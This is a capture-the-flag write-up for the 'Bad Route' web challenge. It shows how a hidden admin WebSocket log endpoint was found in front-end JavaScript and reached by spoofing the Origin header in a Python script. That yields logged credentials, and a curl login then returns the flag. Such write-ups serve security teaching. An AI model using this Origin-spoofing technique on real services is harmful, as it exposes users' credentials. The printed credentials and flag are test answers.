# Bad Route
* Category: Web
* 200 Points
* Solved by the JCTF Team

## Description
> Our company belive that if we go on the bad route of environment pollution we have a direct effect on human health.
> 
> However, some energy companies that are destroying the planet are tried to takedown our website.
> 
> Your mission is to make sure that our new website is secure.

## Solution

The attached website is a simple site with three pages: A home page, an "about" page and a login page. No obvious vulnerabilities related to the login page, so we dive into the sources:

```html
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <title>The Parllel Ocean</title>
  <base href="/">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <link rel="icon" type="image/x-icon" href="favicon.ico">
  <script>window.global = window;</script>
<link rel="stylesheet" href="styles.3ff695c00d717f2d2a11.css"></head>
<body>
  <app-root></app-root>
<script src="runtime.acf0dec4155e77772545.js" defer></script><script src="polyfills.35a5ca1855eb057f016a.js" defer></script><script src="main.b8c73a19106d54f04466.js" defer></script></body>
</html>
```

This is a React application where most of the logic resides in the Javascript code. So, we dive deeper into the Javascript sources. 

Scanning through `main`, we encounter the following code:

```javascript
class t {
    constructor() {}
    connect() {
        new WebSocket("wss://securityocean.corp.local/admin/log")
    }
}
```

This websocket looks interesting. We couldn't find a way to trigger this flow via the website, but we can trigger it manually too via the Javascript Developer Console:

```javascript
var ws = new WebSocket("wss://securityocean.corp.local/admin/log");
ws.onopen = function () {
    console.log('Connection opened');
};

ws.onmessage = function (evt) {
    console.log("Message received = " + evt.data);
};

ws.onclose = function () {
    console.log("Connection closed");
};
```

Output:
```
GET wss://securityocean.corp.local/admin/log
Firefox can’t establish a connection to the server at wss://securityocean.corp.local/admin/log.
Connection closed
```

This makes sense, since we're trying to connect to a `.local` domain:

> The domain name local is a special-use domain name reserved by the Internet Engineering Task Force (IETF) so that it may not be installed as a top-level domain in the Domain Name System (DNS) of the Internet. ([Wikipedia](https://en.wikipedia.org/wiki/.local))

But what if we change the domain to the external one:

```javascript
var ws = new WebSocket("wss://badroute.appsecil.ctf.today/admin/log");
ws.onopen = function () {
    console.log('Connection opened');
};

ws.onmessage = function (evt) {
    console.log("Message received = " + evt.data);
};

ws.onclose = function () {
    console.log("Connection closed");
};
```

Output:
```
GET wss://badroute.appsecil.ctf.today/admin/log
Message received = {"error":"Bad origin provided, abort connection. Expect: ['securityocean.corp.local']"}
Connection closed
```

We now get an error message that the origin should be `securityocean.corp.local`. 

> The Origin request header indicates where a fetch originates from. It doesn't include any path information, but only the server name. It is sent with CORS requests, as well as with POST requests. It is similar to the Referer header, but, unlike this header, it doesn't disclose the whole path.

One way to achieve this is to edit the `hosts` file, add an entry for `securityocean.corp.local`, visit it in the browser and rerun the Javascript code above. Another way is via Python:

```python
import asyncio
import websockets

async def ws_connect():
    async with websockets.connect(
        "wss://badroute.appsecil.ctf.today/admin/log", 
        origin = "https://securityocean.corp.local"
    ) as websocket:
        for i in range(5):
            output = await websocket.recv()
            print(f"< {output}")

asyncio.get_event_loop().run_until_complete(ws_connect())
```

Output:
```console
root@kali:/media/sf_CTFs/appsec/Bad_Route# python3 solve.py
< {"msg":{"email":"livnaAppSec@hotmail.com","pass":"tSec43PasswordL"},"error":"Incorrect username or password."}
< {"msg":{"email":"livnaAppSec@hotmail.com","pass":"tSec43PasswordLivna "},"error":"Incorrect username or password."}
< {"msg":{"email":"livnaAppSec@hotmail.com","pass":"tSec43PasswordL"},"error":"Incorrect username or password."}
< {"msg":{"email":"livnaAppSec@hotmail.com","pass":"tSec43PasswordLivna "},"error":"Incorrect username or password."}
< {"msg":{"email":"livnaAppSec@hotmail.com","pass":"tSec43PasswordL"},"error":"Incorrect username or password."}
```

We can now use the credentials we've received:
```console
root@kali:/media/sf_CTFs/appsec/Bad_Route# curl 'https://badroute.appsecil.ctf.today/users/authenticate' -H 'Content-Type: application/json' --data-raw '{"username":"livnaAppSec@hotmail.com","password":"tSec43PasswordLivna"}' && echo
{"msg":"Congrats! Your Flag is AppSec-IL{Th3_W3bS0ckets_N33ds_2BS3cre}","status":200}
```

The flag: `AppSec-IL{Th3_W3bS0ckets_N33ds_2BS3cre}`